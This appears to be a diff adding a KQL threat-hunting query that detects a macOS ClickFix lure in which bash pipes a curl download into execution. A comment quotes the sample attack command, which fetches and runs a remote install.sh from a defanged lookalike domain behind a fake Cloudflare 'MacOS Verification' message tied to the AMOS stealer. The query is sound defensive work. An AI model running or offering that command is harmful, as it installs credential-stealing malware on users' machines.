@@ -1,0 +1,17 @@
+DeviceProcessEvents
+| where InitiatingProcessFileName has "bash"
+| where InitiatingProcessCommandLine has @"-c "
+| where FolderPath has "/usr/bin/curl"
+| where ProcessCommandLine has_all (@" -fsSL ", @"# MacOS Verification")
+// Description:
+// /bin/bash -c "...": This tells the system to run the command inside the quotes using the Bash shell.
+// curl -fsSL <URL>:
+// -f: Fail silently on HTTP errors.
+// -s: Silent mode (no progress output).
+// -S: Show error if -s is used and the request fails.
+// -L: Follow redirects.
+// It downloads the contents of the script hosted at https://applemacios[.]com/getrur/install.sh.
+// The output of curl (i.e., the install.sh script) is executed immediately by Bash.
+//| summarize count() by InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, ProcessCommandLine
+//Sample: /bin/bash -c "$(curl -fsSL https://applemacios[.]com/getrur/install.sh)" # MacOS Verification #248187 authenticated by Cloudflare. Copyright Cloudflare 2025.
+//Reference(s):["https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers"]
